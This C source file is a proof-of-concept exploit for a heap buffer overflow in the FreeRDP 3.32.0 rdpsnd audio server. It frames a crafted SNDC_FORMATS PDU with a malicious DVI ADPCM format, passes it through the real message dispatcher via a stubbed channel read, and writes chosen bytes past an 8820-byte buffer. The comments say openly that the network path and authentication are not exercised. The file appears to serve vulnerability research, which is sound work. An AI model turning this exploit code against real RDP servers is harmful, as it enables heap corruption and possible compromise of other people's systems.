/*
 * PocRdpsndChannelDispatch.c — real rdpsnd server PDU framing and message
 * dispatch, one step above the direct-parser PoCs.
 *
 * A WTS API table is registered whose VirtualChannelRead serves a scripted
 * in-memory byte stream in bounded chunks. The real exported
 * rdpsnd_server_handle_messages() then reads a fully framed SNDC_FORMATS PDU
 * (4-byte message header + body), reassembles a body split across reads,
 * dispatches on msgType and invokes the real rdpsnd_server_recv_formats()
 * parser from the 3.32.0 source included below. The malicious format is
 * selected and two SendSamples calls place chosen markers past the 8820-byte
 * buffer, as in PocRdpsndChosenBytes.c.
 *
 * The WTS read callback is a stub: this is NOT a live RDP session, virtual
 * channel transport, network path or auth gate. Those remain UNKNOWN.
 * Default posture is post-auth (PR:L, CVSS 8.8); 9.8 only for no-auth.
 *
 * Usage: PocRdpsndChannelDispatch [benign] — "benign" frames one PCM record,
 * which must yield out_frames=0x89d and no chosen-byte write.
 */
#include <freerdp/codec/audio.h>
#include <freerdp/channels/channels.h>
#include <winpr/stream.h>
#include <winpr/wtsapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static AUDIO_FORMAT fmt_pcm = { WAVE_FORMAT_PCM, 2, 44100, 176400, 4, 16, 0, NULL };
static BYTE dvi_ext[2] = { 0xf9, 0x07 };
static AUDIO_FORMAT fmt_dvi = { WAVE_FORMAT_DVI_ADPCM, 2, 44100, 44251, 4, 4, 2, dvi_ext };

/* Real 3.32.0 server source; supplies the static parser, the dispatcher's
 * callees and the real select/send implementations in this translation unit. */
#include "rdpsnd_main.c"

#define CALL_BYTES 16384u
#define WATCH1 8820u
#define WATCH2 (CALL_BYTES + 5000u)

static BYTE g_wire[512];
static size_t g_wire_len;
static size_t g_wire_pos;
static size_t g_chunk = 20; /* force the body to span several channel reads */
static int g_reads;
static WtsApiFunctionTable g_table;

static BOOL WINAPI scripted_read(HANDLE hChannel, ULONG timeout, PCHAR buffer, ULONG size,
                                 PULONG bytesRead)
{
	size_t n = 0;
	(void)hChannel;
	(void)timeout;

	if (g_wire_pos < g_wire_len)
	{
		n = g_wire_len - g_wire_pos;
		if (n > size)
			n = size;
		if (n > g_chunk)
			n = g_chunk;
		memcpy(buffer, g_wire + g_wire_pos, n);
		g_wire_pos += n;
	}
	*bytesRead = (ULONG)n;
	g_reads++;
	return TRUE;
}

static void frame_pdu(int malicious)
{
	wStream* s = Stream_New(g_wire, sizeof(g_wire));
	size_t total = 0;

	/* 4-byte SNDC message header: msgType, bPad, bodySize. */
	Stream_Write_UINT8(s, SNDC_FORMATS);
	Stream_Write_UINT8(s, 0);
	Stream_Write_UINT16(s, 0); /* patched below */

	/* SNDC_FORMATS body (2.2.2.2). */
	Stream_Write_UINT32(s, 0);          /* dwFlags */
	Stream_Write_UINT32(s, 0xffffffff); /* dwVolume */
	Stream_Write_UINT32(s, 0);          /* dwPitch */
	Stream_Write_UINT16(s, 0);          /* wDGramPort */
	Stream_Write_UINT16(s, malicious ? 2 : 1);
	Stream_Write_UINT8(s, 0);    /* cLastBlockConfirmed */
	Stream_Write_UINT16(s, 1);   /* wVersion */
	Stream_Write_UINT8(s, 0);    /* bPad */
	audio_format_write(s, &fmt_pcm);
	if (malicious)
		audio_format_write(s, &fmt_dvi);

	total = Stream_GetPosition(s);
	Stream_SetPosition(s, 2);
	Stream_Write_UINT16(s, (UINT16)(total - 4));
	Stream_Free(s, FALSE);
	g_wire_len = total;
	g_wire_pos = 0;
}

int main(int argc, char** argv)
{
	int malicious = (argc < 2) || (strcmp(argv[1], "benign") != 0);
	RdpsndServerContext* ctx = NULL;
	volatile BYTE* out = NULL;
	BYTE *b1 = NULL, *b2 = NULL;
	UINT rc1 = 0, rc2 = 0, rcsel = 0;
	BYTE inb = 0, m1 = 0, m2 = 0;
	int ok = 1;

	setvbuf(stdout, NULL, _IONBF, 0);
	frame_pdu(malicious);

	g_table = *FreeRDP_InitWtsApi();
	g_table.pVirtualChannelRead = scripted_read;
	if (!WTSRegisterWtsApiFunctionTable(&g_table))
	{
		printf("[dispatch] WTS table registration failed\n");
		return 2;
	}

	ctx = rdpsnd_server_context_new(NULL);
	if (!ctx)
		return 2;
	ctx->src_format = &fmt_pcm;
	ctx->latency = 50;
	InitializeCriticalSectionAndSpinCount(&ctx->priv->lock, 4000);

	rc1 = rdpsnd_server_handle_messages(ctx); /* 4-byte header */
	do
	{
		rc2 = rdpsnd_server_handle_messages(ctx); /* body, in chunks */
	} while (rc2 == CHANNEL_RC_OK && g_wire_pos < g_wire_len);

	printf("handle_header rc=%u handle_body rc=%u reads=%d msgType=%u nformats=%u\n", rc1, rc2,
	       g_reads, ctx->priv->msgType, ctx->num_client_formats);
	if (rc1 != CHANNEL_RC_OK || rc2 != CHANNEL_RC_OK || ctx->priv->msgType != SNDC_FORMATS ||
	    ctx->num_client_formats != (malicious ? 2 : 1))
	{
		ok = 0;
		goto done;
	}
	if (malicious)
	{
		printf("parsed[1]: tag=%u channels=%u blockalign=%u cbsize=%u\n",
		       ctx->client_formats[1].wFormatTag, ctx->client_formats[1].nChannels,
		       ctx->client_formats[1].nBlockAlign, ctx->client_formats[1].cbSize);
	}

	ctx->SelectFormat(ctx, 0); /* benign PCM allocates 8820 bytes */
	rcsel = ctx->SelectFormat(ctx, malicious ? 1 : 0);
	out = (volatile BYTE*)ctx->priv->out_buffer;
	printf("SelectFormat rc=%u out_frames=0x%016zx out_buffer_size=%zu\n", rcsel,
	       ctx->priv->out_frames, ctx->priv->out_buffer_size);

	if (!malicious)
	{
		ok = (rcsel == 0 && ctx->priv->out_frames == 0x89d);
		goto done;
	}
	/* The failed realloc returns CHANNEL_RC_NO_MEMORY (12) but leaves the
	 * wrapped out_frames in place; that is the vulnerable state we drive. */
	if (rcsel != CHANNEL_RC_NO_MEMORY || ctx->priv->out_frames != (size_t)-16 ||
	    ctx->priv->out_buffer_size != 8820)
	{
		ok = 0;
		goto done;
	}

	b1 = (BYTE*)malloc(CALL_BYTES);
	b2 = (BYTE*)malloc(CALL_BYTES);
	memset(b1, 0x11, CALL_BYTES);
	memset(b2, 0x22, CALL_BYTES);
	b1[WATCH1] = 0xDE;
	b2[WATCH2 - CALL_BYTES] = 0xAD;
	ctx->SendSamples(ctx, b1, 4096, 0);
	ctx->SendSamples(ctx, b2, 4096, 0);

	inb = out[8819];
	m1 = out[WATCH1];
	m2 = out[WATCH2];
	printf("readback offset 8819=%02x offset 8820=%02x offset 21384=%02x\n", inb, m1, m2);
	printf("out_pending_frames=%zu out_frames=0x%016zx\n", ctx->priv->out_pending_frames,
	       ctx->priv->out_frames);
	ok = (inb == 0x11) && (m1 == 0xDE) && (m2 == 0xAD) &&
	     (ctx->priv->out_pending_frames == 8192);

done:
	printf("[dispatch] %s RESULT=%s\n", malicious ? "chosen" : "benign", ok ? "PASS" : "FAIL");
	/* The malicious case corrupts the heap; skip destructors after flushing. */
	fflush(stdout);
	_exit(ok ? 0 : 1);
}
